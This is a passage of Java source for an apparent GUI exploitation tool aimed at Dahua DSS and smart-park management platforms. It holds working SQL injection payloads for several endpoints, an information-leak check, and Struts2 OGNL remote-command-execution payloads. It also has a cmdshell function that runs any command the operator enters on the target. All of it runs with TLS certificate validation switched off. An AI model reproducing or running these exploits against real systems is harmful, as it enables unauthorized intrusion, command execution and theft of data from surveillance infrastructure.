            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "text/xml; charset=UTF-8");
            OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
            writer.write(json);
            writer.close();


            //   test1.appendText(response.toString());
            int responseCode = connection.getResponseCode();

            if (responseCode == HttpURLConnection.HTTP_OK) {

                ceshibug();

                //   cmd1.appendText(formattedDateTime + "写入成功" + url + "/upload/c.jsp" + "" + "\n");
                //     cmd.appendText(formattedDateTime + url + "/portal/services/itcBulletin" + "\n");


            } else {

                     cmd1.appendText(formattedDateTime + "测试文件写入失败" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
               cmd1.appendText(formattedDateTime + "测试文件写入失败null" + "\n");
            //     System.out.println(e);
        }


    }


    @FXML
    void rce13(ActionEvent event) {

        rc15();

    }


    private HostServices hostServices;

    @FXML
    void re(ActionEvent event) {


        String selectedItem = comber.getValue();
        if (test2.getText().isEmpty()) {

            cmd1.appendText("未输入目标！" + "\n");
        } else {


            if ("ALL".equals(selectedItem)) {

                Alert alert = new Alert(Alert.AlertType.ERROR);
                alert.setTitle("拼写检查");
                alert.setHeaderText("");
                alert.setContentText("请选择模块！");
                alert.showAndWait();
            } else if ("大华智慧园区综合管理平台poi任意文件上传漏洞".equals(selectedItem)) {


                poi1();


            } else if ("大华智慧园区综合管理平台video任意文件上传漏洞".equals(selectedItem)) {


                voide();
            } else if ("大华智慧园区综合管理平台emap任意文件上传漏洞".equals(selectedItem)) {


                emaph();
            }
        }
    }

    @FXML
    void re1(ActionEvent event) {
        String selectedItem = comboBox3.getValue();

        if ("大华DSS数字监控系统远程命令执行漏洞".equals(selectedItem)) {

            rc12();
        }
        if ("大华智能物联综合管理平台fastjson远程代码执行漏洞".equals(selectedItem)) {

            rc12();
        }
    }

    @FXML
    void rce5(ActionEvent event) {


        String selectedItem = comboBox.getValue();

        if ("ALL".equals(selectedItem)) {

            rce2();
            rce4();
            rce5();
            rce6();
            rce7();
            rce8();
            rce9();
            rce20();
            video();
            emap();
            get();
            login();
            poi();
            //   delp();
            //    send();
            //     random();
            //   ipms();
            //  yan();

            //    rce21();

        } else if ("大华DSS数字监控系统attachment_clearTempFile.action注入漏洞".equals(selectedItem)) {
            rce2();
        } else if ("大华DSS数字监控系统远程命令执行漏洞".equals(selectedItem)) {
            rce4();
        } else if ("大华DSS数字监控系统itcBulletin注入漏洞".equals(selectedItem)) {
            rce5();
        } else if ("大华智慧园区综合管理平台信息泄露漏洞".equals(selectedItem)) {
            rce6();

        } else if ("大华智慧园区综合管理平台getNewStaypointDetailQuery注入漏洞".equals(selectedItem)) {
            rce7();

        } else if ("大华智慧园区综合管理平台clientserver注入".equals(selectedItem)) {
            rce8();

        } else if ("大华DSS user_edit.action信息泄露漏洞".equals(selectedItem)) {
            rce9();

        } else if ("大华智慧园区综合管理平台poi任意文件上传漏洞".equals(selectedItem)) {
            poi();
        } else if ("大华智慧园区综合管理平台video任意文件上传漏洞".equals(selectedItem)) {

            video();


        } else if ("大华智慧园区综合管理平台emap任意文件上传漏洞".equals(selectedItem)) {
            emap();

        } else if ("大华智慧园区综合管理平台searchJson注入漏洞".equals(selectedItem)) {

            rce20();
        } else if ("大华DSS数字监控系统attachment_getAttList.action注入漏洞".equals(selectedItem)) {

            get();

        } else if ("大华智能物联综合管理平台justForTest用户登录漏洞".equals(selectedItem)) {

            login();

        } else if ("大华智能物联综合管理平台random远程命令执行漏洞".equals(selectedItem)) {

            //      random();


        } else if ("大华智慧园区综合管理平台deleteFtp远程命令执行漏洞".equals(selectedItem)) {
            //   delp();

            //      random();


        } else if ("大华智慧园区综合管理平台sendFaceInfo远程命令执行漏洞".equals(selectedItem)) {
            //  send();

            //      random();


        }
    }


    @FXML
    void rce3(ActionEvent event) {

        test1.clear();
        cmd.clear();
        url10.clear();
        cmd1.clear();

    }

    @FXML
    void rce4(ActionEvent event) {

        id();


    }


    public void rce2() {


        try {


            //   if(test2.getText().equals("")){

            //  Alert alert = new Alert(Alert.AlertType.ERROR);

            //   alert.setHeaderText("");
            //  alert.setContentText("请输入目标");
            // alert.showAndWait();

            //  } else {

            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //   System.setProperty("http.proxyHost", "127.0.0.1");
            //   System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(url + "/portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,user(),0x7e))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {

                response.append(inputLine);
                //    test1.appendText(response.toString());


            }
            //  int responseCode = connection.getResponseCode();
            if (response.toString().contains("XPATH")) {

                test1.appendText(formattedDateTime + "[+]存在大华DSS数字监控系统attachment_clearTempFile.action注入漏洞" + "\n");
                test1.appendText(formattedDateTime + url + "/portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,user(),0x7e))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1" + "\n");

            } else {

                test1.appendText(formattedDateTime + "[-]不存在大华DSS数字监控系统attachment_clearTempFile.action注入漏洞" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            test1.appendText(formattedDateTime + "[-]不存在大华DSS数字监控系统attachment_clearTempFile.action注入漏洞" + "\n");


        }
    }


    public void rce1(ActionEvent actionEvent) {


        test1.clear();
        rce2();
        rce4();
        rce5();
        rce6();
        rce7();
        rce8();
        rce9();

        rce20();
        video();
        emap();
        get();
        login();
        poi();
        //   delp();
        //    send();
        //  random();
        // ipms();
        //    yan();
        // rce21();
    }

    public void id() {


        try {

            HostServicesDelegate.getInstance(this).showDocument("https://github.com/MInggongK");

        } catch (Exception e) {


        }

    }

    @FXML
    void rce6(ActionEvent event) {

        cmdshell();

    }


    @Override
    public void start(Stage primaryStage) throws Exception {

    }

    public void rce3() {


    }

    private boolean isValidUrl(String url) {

        String urlRegex = "^(http|https)://[^\\s]*$";
        return url.matches(urlRegex);

    }


    public void rce4() {


        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        if (!isValidUrl(url)) test1.appendText("输入的不是有效的网址" + "\n");
        else {
            // if (!isValidUrl(url)) {
            //       test1.appendText("输入的不是有效的网址" + "\n");
            //    Alert alert = new Alert(Alert.AlertType.ERROR);alert.setTitle("拼写检查");alert.setHeaderText("");alert.setContentText("输入的不是有效的网址！");alert.showAndWait();
            //  } else {


            try {

                HostnameVerifier hv = new HostnameVerifier() {
                    @Override
                    public boolean verify(String urlHostName, SSLSession session) {
                        return true;
                    }
                };

                TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
                SSLContext sc = SSLContext.getInstance("SSL");
                SSLSessionContext sslsc = sc.getServerSessionContext();
                sslsc.setSessionTimeout(0);
                sc.init(null, trustAllCerts, null);
                HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

                HttpsURLConnection.setDefaultHostnameVerifier(hv);
                // System.setProperty("http.proxyHost", "127.0.0.1");
                //   System.setProperty("http.proxyPort", "8080");
                LocalDateTime now = LocalDateTime.now();
                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
                String formattedDateTime = now.format(formatter);
                URL url1 = new URL(url + "/admin/login_login.action");
                String json = "";
                HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
                connection.setDoOutput(true);
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo test').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}");
                byte[] input = json.getBytes(StandardCharsets.UTF_8);
                OutputStream os = connection.getOutputStream();
                os.write(input, 0, input.length);
                os.flush();
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer response = new StringBuffer();
                String inputLine;
                response.append(inputLine = br.readLine());
                while ((inputLine = br.readLine()) != null) {
                }
                response.append(inputLine);
                //    test1.appendText(response.toString());
                if (response.toString().contains("test")) {

                    test1.appendText(formattedDateTime + "[+]存在大华DSS数字监控系统远程命令执行漏洞" + "\n");

                } else {

                    test1.appendText(formattedDateTime + "[-]不存在大华DSS数字监控系统远程命令执行漏洞" + "\n");
                }


            } catch (Exception e) {
                LocalDateTime now = LocalDateTime.now();
                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
                String formattedDateTime = now.format(formatter);
                test1.appendText(formattedDateTime + "[-]不存在大华DSS数字监控系统远程命令执行漏洞" + "\n");
            }


        }

    }

    public void rce5() {


        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        // if (!isValidUrl(url)) {
        //       test1.appendText("输入的不是有效的网址" + "\n");
        //    Alert alert = new Alert(Alert.AlertType.ERROR);alert.setTitle("拼写检查");alert.setHeaderText("");alert.setContentText("输入的不是有效的网址！");alert.showAndWait();
        //  } else {


        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            //       System.setProperty("http.proxyHost", "127.0.0.1");
            //   System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/portal/services/itcBulletin?Wsdl");
            String json = "<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>\n" +
                    "  <s11:Body>\n" +
                    "    <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>\n" +
                    "      <netMarkings>\n" +
                    "        (updatexml(1,concat(0x7e,md5(1224),0x7e),1))) and (1=1\n" +
                    "      </netMarkings>\n" +
                    "    </ns1:deleteBulletin>\n" +
                    "  </s11:Body>\n" +
                    "</s11:Envelope>";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/xml; charset=UTF-8");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();


            //    BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));


            //   }
            //   response.append(inputLine);
            //    test1.appendText(response.toString());

            //      String a="68d13cf26c4b4f4f932e3eff990093b'";


            int responseCode = connection.getResponseCode();

            if (responseCode == 500) {

                BufferedReader errorReader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
                String line;
                StringBuilder errorResponse = new StringBuilder();
                while ((line = errorReader.readLine()) != null) {
                    errorResponse.append(line);
                }

                //   test1.appendText(errorResponse.toString());

                if (errorResponse.toString().contains("68d13cf26c4b4f4f932e3eff990093b")) {

                    test1.appendText(formattedDateTime + "[+]存在大华DSS数字监控系统itcBulletin注入漏洞" + "\n");
                    test1.appendText(formattedDateTime + url + "/portal/services/itcBulletin?wsdl" + "\n");
                } else {

                    test1.appendText(formattedDateTime + "[-]不存在大华DSS数字监控系统itcBulletin注入漏洞" + "\n");
                }


                //     test1.appendText(response.toString());
                //  BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                //   StringBuffer response = new StringBuffer();
                //   String inputLine;
                //  response.append(inputLine = br.readLine());
                //  while ((inputLine = br.readLine()) != null) {
                //      response.append(inputLine);
                //   }
                //  response.append(inputLine = br.readLine());


                //    test1.appendText(formattedDateTime + "[+]存在大华DSS数字监控系统itcBulletin注入漏洞" + "\n");


                //  test1.appendText(formattedDateTime + url + "/portal/services/itcBulletin" + "\n");


            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            test1.appendText(formattedDateTime + "[-]不存在大华DSS数字监控系统itcBulletin注入漏洞" + "\n");
        }


    }

    public void cmdshell() {


        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        if (!isValidUrl(url)) {
            test1.appendText("输入的不是有效的网址" + "\n");
            //    Alert alert = new Alert(Alert.AlertType.ERROR);alert.setTitle("拼写检查");alert.setHeaderText("");alert.setContentText("输入的不是有效的网址！");alert.showAndWait();
        } else {


            try {

                HostnameVerifier hv = new HostnameVerifier() {
                    @Override
                    public boolean verify(String urlHostName, SSLSession session) {
                        return true;
                    }
                };

                TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
                SSLContext sc = SSLContext.getInstance("SSL");
                SSLSessionContext sslsc = sc.getServerSessionContext();
                sslsc.setSessionTimeout(0);
                sc.init(null, trustAllCerts, null);
                HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

                HttpsURLConnection.setDefaultHostnameVerifier(hv);
                //    System.setProperty("http.proxyHost", "127.0.0.1");
                //   System.setProperty("http.proxyPort", "8080");
                LocalDateTime now = LocalDateTime.now();
                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
                String formattedDateTime = now.format(formatter);
                URL url1 = new URL(url + "/admin/login_login.action");
                String json = "";
                HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
                connection.setDoOutput(true);
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + test3.getText() + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}");
                byte[] input = json.getBytes(StandardCharsets.UTF_8);
                OutputStream os = connection.getOutputStream();
                os.write(input, 0, input.length);
                os.flush();
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer response = new StringBuffer();
                String inputLine;
                response.append(inputLine = br.readLine());
                while ((inputLine = br.readLine()) != null) {
                    response.append(inputLine);
                }
                response.append(inputLine = br.readLine());
                cmd.appendText(response.toString() + "\n");


            } catch (Exception e) {
                LocalDateTime now = LocalDateTime.now();
                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
                String formattedDateTime = now.format(formatter);

                cmd.appendText(formattedDateTime + "命令执行失败" + "\n");
            }


        }

    }

    public void rce6() {
        try {


            //   if(test2.getText().equals("")){

            //  Alert alert = new Alert(Alert.AlertType.ERROR);

            //   alert.setHeaderText("");
            //  alert.setContentText("请输入目标");
            // alert.showAndWait();

            //  } else {

            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //     System.setProperty("http.proxyHost", "127.0.0.1");
            //      System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(url + "/admin/user_getUserInfoByUserName.action?userName=system");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            //  BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            //   StringBuffer response = new StringBuffer();
            //  String inputLine;
            //  response.append(inputLine = br.readLine());
            //  while ((inputLine = br.readLine()) != null) {

            //    response.append(inputLine);
            //    test1.appendText(response.toString());
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {

                response.append(inputLine);


                //    test1.appendText(response.toString());
            }


            //  int responseCode = connection.getResponseCode();
            if (response.toString().contains("loginName")) {

                test1.appendText(formattedDateTime + "[+]存在大华智慧园区综合管理平台信息泄露漏洞" + "\n");
                test1.appendText(formattedDateTime + response.toString() + "\n");

            } else {

                test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台信息泄露漏洞" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台信息泄露漏洞" + "\n");


        }

    }

    public void rce7() {

        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        // if (!isValidUrl(url)) {
        //       test1.appendText("输入的不是有效的网址" + "\n");
        //    Alert alert = new Alert(Alert.AlertType.ERROR);alert.setTitle("拼写检查");alert.setHeaderText("");alert.setContentText("输入的不是有效的网址！");alert.showAndWait();
        //  } else {


        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            //  System.setProperty("http.proxyHost", "127.0.0.1");
            //     System.setProperty("http.proxyPort", "8082");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/portal/services/carQuery/getNewStaypointDetailQuery");
            String json = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:car=\"http://carQuery.webservice.dssc.dahua.com\">\n" +
                    "<soapenv:Header/>\n" +
                    "<soapenv:Body>\n" +
                    "<car:getNewStaypointDetailQuery>\n" +
                    "<!--type: string-->\n" +
                    "<searchJson>{}</searchJson>\n" +
                    "<!--type: string-->\n" +
                    "<pageJson>{\"orderBy\":\"1 and 1=updatexml(1,concat(0x7e,(select md5(123456)),0x7e),1)--\"}</pageJson>\n" +
                    "<!--type: string-->\n" +
                    "<extend>quae divum incedo</extend>\n" +
                    "</car:getNewStaypointDetailQuery>\n" +
                    "</soapenv:Body>";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "text/xml; charset=UTF-8");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();


            //    test1.appendText(response.toString());
            int responseCode = connection.getResponseCode();

            if (responseCode == 500) {


                BufferedReader errorReader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
                String line;
                StringBuilder errorResponse = new StringBuilder();
                while ((line = errorReader.readLine()) != null) {
                    errorResponse.append(line);
                }

                //   test1.appendText(errorResponse.toString());

                if (errorResponse.toString().contains("e10adc3949ba59abbe56e057f20f883")) {

                    test1.appendText(formattedDateTime + "[+]存在大华智慧园区综合管理平台getNewStaypointDetailQuery注入漏洞" + "\n");
                    test1.appendText(formattedDateTime + url + "/portal/services/carQuery/getNewStaypointDetailQuery?wsdl" + "\n");

                } else {

                    test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台getNewStaypointDetailQuery注入漏洞" + "\n");
                }


            }

        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台getNewStaypointDetailQuery注入" + "\n");
        }


    }

    public void rce8() {

        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        // if (!isValidUrl(url)) {
        //       test1.appendText("输入的不是有效的网址" + "\n");
        //    Alert alert = new Alert(Alert.AlertType.ERROR);alert.setTitle("拼写检查");alert.setHeaderText("");alert.setContentText("输入的不是有效的网址！");alert.showAndWait();
        //  } else {


        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            //        System.setProperty("http.proxyHost", "127.0.0.1");
            //        System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/portal/services/clientServer");
            String json = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:cli=\"http://clientServer.webservice.dssc.dahua.com\">\n" +
                    "  <soapenv:Header/>\n" +
                    "  <soapenv:Body>\n" +
                    "  <cli:getGroupInfoListByGroupId>\n" +
                    "    <!--type: string-->\n" +
                    "      <arg0>-1) UNION ALL SELECT 1,2,3,4,md5(123456)-- -</arg0>\n" +
                    "    <!--type: long-->\n" +
                    "    <arg1>1</arg1>\n" +
                    "    </cli:getGroupInfoListByGroupId>\n" +
                    "    </soapenv:Body>\n" +
                    "  </soapenv:Envelope>\n";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "text/xml; charset=UTF-8");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {
            }
            response.append(inputLine);
            //    test1.appendText(response.toString());
            int responseCode = connection.getResponseCode();

            if (response.toString().contains("e10adc3949ba59abbe56e057f20f883e")) {

                test1.appendText(formattedDateTime + "[+]存在大华智慧园区综合管理平台clientserver注入漏洞" + "\n");
                test1.appendText(formattedDateTime + url + "/portal/services/clientServer?wsdl" + "\n");


            } else {

                test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台clientserver注入漏洞" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台clientserver注入漏洞" + "\n");
        }


    }

    public void rce9() {


        try {


            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //     System.setProperty("http.proxyHost", "127.0.0.1");
            //      System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(url + "/admin/cascade_/user_edit.action?id=1");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            //  BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            //   StringBuffer response = new StringBuffer();
            //  String inputLine;
